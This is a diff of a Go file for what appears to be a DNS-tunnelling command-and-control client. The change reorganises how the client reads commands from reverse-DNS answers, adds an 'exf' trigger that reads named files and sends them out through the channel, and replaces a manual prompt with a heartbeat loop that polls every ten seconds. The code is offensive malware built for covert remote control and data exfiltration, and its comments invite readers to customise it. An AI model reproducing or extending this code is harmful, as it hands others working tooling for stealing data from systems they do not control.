@@ -13,32 +13,17 @@ import (
 	"time"
 )
 
-// We will send the encoded data, and inspect the received hostname to see if the server wants the client to perform any actions. All strings used as triggers here can be replaced.
-func resolveAddr(address string, bl *int) {
-
+func resolveCommand(host []string, bl *int) {
 	// Change the mappings here to customize what triggers will be responsible for different operations. Ex: "cmd": "mail"
-	trigger_mappings := map[string]string{"cmd": "cmd", "dwl": "dwl", "ls": "ls"}
-
-	// Specify your server address and port that will receive and decode the encoded data
-	r := &net.Resolver{
-		PreferGo: true,
-		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
-			d := net.Dialer{
-				Timeout: time.Millisecond * time.Duration(10000),
-			}
-			return d.DialContext(ctx, network, "127.0.0.1:8053")
-		},
-	}
-	host, _ := r.LookupAddr(context.Background(), address)
+	trigger_mappings := map[string]string{"cmd": "cmd", "exf": "exf", "ls": "ls"}
 
 	// If the host contains the string "cmd", we know that the server is sending the client a command to execute.
 	if strings.Contains(host[0], trigger_mappings["cmd"]) {
-
 		fmt.Printf("Received command: %v\n", host[0])
 		sections := strings.Split(host[0], ".")
 		switch sections[1] {
 		// Download command has been received
-		case trigger_mappings["dwl"]:
+		case trigger_mappings["exf"]:
 			fmt.Printf("Downloading: %v\n", (sections[2] + "." + sections[3]))
 			// Perform the usual exfil operation as you would otherwise
 			dat := setup_exfil(sections[2] + "." + sections[3])
@@ -67,6 +52,25 @@ func resolveAddr(address string, bl *int) {
 			begin_comm(&output_bytes, bl, &mode)
 		}
 	}
+}
+
+// We will send the encoded data, and inspect the received hostname to see if the server wants the client to perform any actions. All strings used as triggers here can be replaced.
+func resolveAddr(address string, bl *int) {
+	// Specify your server address and port that will receive and decode the encoded data
+	r := &net.Resolver{
+		PreferGo: true,
+		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+			d := net.Dialer{
+				Timeout: time.Millisecond * 1000,
+			}
+			return d.DialContext(ctx, network, "127.0.0.1:8053")
+		},
+	}
+	host, _ := r.LookupAddr(context.Background(), address)
+	if len(host) > 0 {
+		resolveCommand(host, bl)
+	}
+
 }
 
 func send_data(set_baseline bool, octets []byte, bl *int, mode ...*string) {
@@ -171,10 +175,10 @@ func begin_comm(dat *[]byte, bp *int, mode *string) {
 func main() {
 	var baseline int
 	var mode string = "c2"
-
-	var command string
-	fmt.Print("Enter your command: ")
-	fmt.Scan(&command)
-	command_bytes := []byte(command)
-	begin_comm(&command_bytes, &baseline, &mode)
+	var command string = "hbt"
+	for {
+		command_bytes := []byte(command)
+		begin_comm(&command_bytes, &baseline, &mode)
+		time.Sleep(10000 * time.Millisecond)
+	}
 }
